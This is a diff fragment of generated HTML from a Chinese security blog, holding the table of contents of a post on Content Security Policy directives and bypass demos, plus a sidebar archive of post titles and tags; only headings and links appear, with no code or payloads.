toc-level-3"><a class="toc-link" href="#Demo-10-sandbox-Bypass"><span class="toc-number">4.9.</span> <span class="toc-text">Demo 10 - sandbox Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-without-X-Frame-Options-DENY"><span class="toc-number">4.9.1.</span> <span class="toc-text">1. without X-Frame-Options:DENY</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#练习题-6"><span class="toc-number">4.9.1.1.</span> <span class="toc-text">练习题</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-with-X-Frame-Options-DENY"><span class="toc-number">4.9.2.</span> <span class="toc-text">2. with X-Frame-Options:DENY</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-11-JPEG"><span class="toc-number">4.10.</span> <span class="toc-text">Demo 11 - JPEG</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#推荐延伸"><span class="toc-number">5.</span> <span class="toc-text">推荐延伸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">6.</span> <span class="toc-text">参考资料</span></a></li></ol> -->
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#启用-CSP-方式"><span class="toc-text">启用 CSP 方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#语法"><span class="toc-text">语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#指令"><span class="toc-text">指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#获取指令-Fetch-directives"><span class="toc-text">获取指令 Fetch directives</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#child-src"><span class="toc-text">child-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#connect-src"><span class="toc-text">connect-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#default-src"><span class="toc-text">default-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#font-src"><span class="toc-text">font-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#frame-src"><span class="toc-text">frame-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#img-src"><span class="toc-text">img-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#manifest-src"><span class="toc-text">manifest-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#media-src"><span class="toc-text">media-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#object-src"><span class="toc-text">object-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#script-src"><span class="toc-text">script-src</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#unsafe-inline"><span class="toc-text">unsafe-inline</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#unsafe-eval"><span class="toc-text">unsafe-eval</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#strict-dynamic"><span class="toc-text">strict-dynamic</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#style-src"><span class="toc-text">style-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#webrtc-src"><span class="toc-text">webrtc-src</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#worker-src"><span class="toc-text">worker-src</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文档指令-Document-directives"><span class="toc-text">文档指令 Document directives</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#base-uri"><span class="toc-text">base-uri</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#plugin-types"><span class="toc-text">plugin-types</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sandbox"><span class="toc-text">sandbox</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#导航指令-Navigation-directives"><span class="toc-text">导航指令 Navigation directives</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#form-action"><span class="toc-text">form-action</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#frame-ancestors"><span class="toc-text">frame-ancestors</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#navigation-to"><span class="toc-text">navigation-to</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报告指令-amp-其他指令"><span class="toc-text">报告指令 &amp; 其他指令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-1-iframe-CSP-attribute"><span class="toc-text">Demo 1 - iframe CSP attribute</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#练习题"><span class="toc-text">练习题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-2-base-uri"><span class="toc-text">Demo 2 - base-uri</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#练习题-1"><span class="toc-text">练习题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-3-CDN"><span class="toc-text">Demo 3 - CDN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#练习题-2"><span class="toc-text">练习题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-4-JSONP"><span class="toc-text">Demo 4 - JSONP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#练习题-3"><span class="toc-text">练习题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-5-Script-Tag"><span class="toc-text">Demo 5 - Script Tag</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#练习题-4"><span class="toc-text">练习题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-6-SVG"><span class="toc-text">Demo 6 - SVG</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#练习题-5"><span class="toc-text">练习题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-8-Cache-poisoning"><span class="toc-text">Demo 8 - Cache poisoning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-9-Static-Resource"><span class="toc-text">Demo 9 - Static Resource</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#准备步骤"><span class="toc-text">准备步骤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-10-sandbox-Bypass"><span class="toc-text">Demo 10 - sandbox Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-without-X-Frame-Options-DENY"><span class="toc-text">1. without X-Frame-Options:DENY</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#练习题-6"><span class="toc-text">练习题</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-with-X-Frame-Options-DENY"><span class="toc-text">2. with X-Frame-Options:DENY</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo-11-JPEG"><span class="toc-text">Demo 11 - JPEG</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#推荐延伸"><span class="toc-text">推荐延伸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-text">参考资料</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 74
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/posts/9a92d107/" >🔐</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/posts/fd03bf87/" >🔐</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/12</span><a class="archive-post-title" href= "/posts/df08045a/" >🔐</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/posts/787c7e6c/" >🔐</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/posts/55ea3bd4/" >Shiro-055 分析&回显</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/posts/6712089c/" >深信服 EDR RCE 简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/04</span><a class="archive-post-title" href= "/posts/c5e878c3/" >CobaltStrike Argue 原理 - 翻译文</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/02</span><a class="archive-post-title" href= "/posts/afd91327/" >Github Page 加速</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span><a class="archive-post-title" href= "/posts/76ce816c/" >CobaltStrike 破解步骤</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/posts/b7ea5c49/" >一道题回顾智能合约 Coverage</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/06</span><a class="archive-post-title" href= "/posts/58a67794/" >F5 BIG-IP RCE简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/posts/608d18f0/" >用友NC反序列化 简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/14</span><a class="archive-post-title" href= "/posts/d4fb29f2/" >Pwnable.kr 之 Toddler's Bottle</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/posts/ecb4dfa2/" >Weblogic T3 协议学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/20</span><a class="archive-post-title" href= "/posts/e32c5d3e/" >CVE-2020-2551 简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/posts/fa80d225/" >CVE-2020-2555 简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href= "/posts/91ba290f/" >Java 反弹 Shell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span><a class="archive-post-title" href= "/posts/56fcf5d8/" >Thinkphp 5.0.x 反序列化简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/22</span><a class="archive-post-title" href= "/posts/7d9ef63e/" >CVE-2020-1938（Ghost Cat）简单分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/17</span><a class="archive-post-title" href= "/posts/2cc5b12d/" >JDBC Deserialization</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/16</span><a class="archive-post-title" href= "/posts/f0f80c65/" >Abusing MySQL clients RCE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/posts/f33694e6/" >2020 All is New</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/25</span><a class="archive-post-title" href= "/posts/418c3786/" >对 Cookie 的一点学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/18</span><a class="archive-post-title" href= "/posts/1e8439b5/" >HTTP Smuggling Attack 随笔</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/10</span><a class="archive-post-title" href= "/posts/b61194b/" >ThinkPHP 6.0.x 反序列化简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/07</span><a class="archive-post-title" href= "/posts/4457d4a3/" >ThinkPHP 5.1.x 反序列化简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span><a class="archive-post-title" href= "/posts/a3557ae1/" >记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/12</span><a class="archive-post-title" href= "/posts/9622f295/" >Mysql 注入基础小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/03</span><a class="archive-post-title" href= "/posts/a62f29f1/" >XSS with ServiceWorkers</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/posts/66ad34dc/" >CSP 小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/07</span><a class="archive-post-title" href= "/posts/13977d3a/" >SVG with HTML Parsing</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/posts/76496c2b/" >Fastjson 新反序列化漏洞解析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/16</span><a class="archive-post-title" href= "/posts/85fdfb64/" >SSRF 小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/posts/d8415c32/" >Discuz! ML 3.x 命令执行简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/10</span><a class="archive-post-title" href= "/posts/fb0090e/" >Redis Rce 简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span><a class="archive-post-title" href= "/posts/8dea0d95/" >Sqlmap --os-shell 原理简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/15</span><a class="archive-post-title" href= "/posts/6fee1744/" >Active Directory Recon 初步学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href= "/posts/caf0d20c/" >RCTF 2019 WEB writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href= "/posts/73ecd8cc/" >Jenkins CVE-2018-1000861 学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/07</span><a class="archive-post-title" href= "/posts/65a5a87a/" >*CTF 2019 homebrewEvtLoop</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/27</span><a class="archive-post-title" href= "/posts/243b6098/" >Web(CTF)中的密码学 (一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href= "/posts/7a31e713/" >Abusing MySQL Clients 学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/12</span><a class="archive-post-title" href= "/posts/8e809579/" >DDCTF 2019 部分 writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/30</span><a class="archive-post-title" href= "/posts/6fdffa73/" >0CTF/TCTF 2019 WEB writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/18</span><a class="archive-post-title" href= "/posts/1b4ade61/" >JSONP Content-Type 简单Fuzz</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/posts/469de5e6/" >JNDI/LADP 学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/07</span><a class="archive-post-title" href= "/posts/284d4995/" >Fastjson 反序列化漏洞研究</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/06</span><a class="archive-post-title" href= "/posts/fdaf04b/" >SMTP 25 端口测试记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/06</span><a class="archive-post-title" href= "/posts/9b1f3ba/" >pyppeteer 学习记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/31</span><a class="archive-post-title" href= "/posts/4ffb62e5/" >Python 多线程、多进程、协程(未完结)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/29</span><a class="archive-post-title" href= "/posts/83241730/" >Frida —— WeChat(二) 🧧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/posts/b11f7440/" >动态调试 with smali</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/24</span><a class="archive-post-title" href= "/posts/76594cbe/" >Nexus 解决显示 “无法访问互联网”</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/19</span><a class="archive-post-title" href= "/posts/5da99ec5/" >Frida —— WeChat(一) 🎲</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/16</span><a class="archive-post-title" href= "/posts/d55cdeb2/" >Frida —— 初体验</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/posts/446263e2/" >关系爬虫 —— Weibo</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/posts/27a5d990/" >2019 All For One</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span><a class="archive-post-title" href= "/posts/9dafb9a3/" >OpenCV 初接触</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/24</span><a class="archive-post-title" href= "/posts/2fefc8f7/" >验证码破解系列 —— 数美</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/21</span><a class="archive-post-title" href= "/posts/f8004910/" >Chrome Extensions —— fir.im Downloader 编写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/19</span><a class="archive-post-title" href= "/posts/fedef51/" >XXE 小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/14</span><a class="archive-post-title" href= "/posts/90979812/" >Burp Extensions —— RSA Plugin 编写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href= "/posts/81dfbfaf/" >CODE BREAKING</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/23</span><a class="archive-post-title" href= "/posts/4a17b156/" >Hello World</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/08</span><a class="archive-post-title" href= "/posts/970fcb23/" >OGNL Payload</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/posts/d34dbe44/" >s2-016 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href= "/posts/626780ce/" >s2-032 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span><a class="archive-post-title" href= "/posts/617314e9/" >s2-033 & s2-037 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/posts/9cab2514/" >s2-045 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href= "/posts/e0ca00cf/" >s2-046 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/posts/2b51554f/" >s2-048 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/11</span><a class="archive-post-title" href= "/posts/2b51554f/" >s2-048 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/09</span><a class="archive-post-title" href= "/posts/dd92b54a/" >s2-053 漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/08</span><a class="archive-post-title" href= "/posts/c43e3a51/" >s2-057 漏洞分析</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="随笔"><span class="iconfont-archer">&#xe606;</span>随笔</span>
+    
+        <span class="sidebar-tag-name" data-tags="Mysql"><span class="iconfont-archer">&#xe606;</span>Mysql</span>
+    
+        <span class="sidebar-tag-name" data-tags="内网"><span class="iconfont-archer">&#xe606;</span>内网</span>
+    
+        <span class="sidebar-tag-name" data-tags="RedTeam"><span class="iconfont-archer">&#xe606;</span>RedTeam</span>
+    
+        <span class="sidebar-tag-name" data-tags="Burp suite"><span class="iconfont-archer">&#xe606;</span>Burp suite</span>
+    
+        <span class="sidebar-tag-name" data-tags="coding"><span class="iconfont-archer">&#xe606;</span>coding</span>
+    
+        <span class="sidebar-tag-name" data-tags="extension"><span class="iconfont-archer">&#xe606;</span>extension</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="Tomcat"><span class="iconfont-archer">&#xe606;</span>Tomcat</span>
+    
+        <span class="sidebar-tag-name" data-tags="LFI"><span class="iconfont-archer">&#xe606;</span>LFI</span>
+    
+        <span class="sidebar-tag-name" data-tags="RCE"><span class="iconfont-archer">&#xe606;</span>RCE</span>
+    
+        <span class="sidebar-tag-name" data-tags="Weblogic"><span class="iconfont-archer">&#xe606;</span>Weblogic</span>
+    
+        <span class="sidebar-tag-name" data-tags="Deserialize"><span class="iconfont-archer">&#xe606;</span>Deserialize</span>
+    
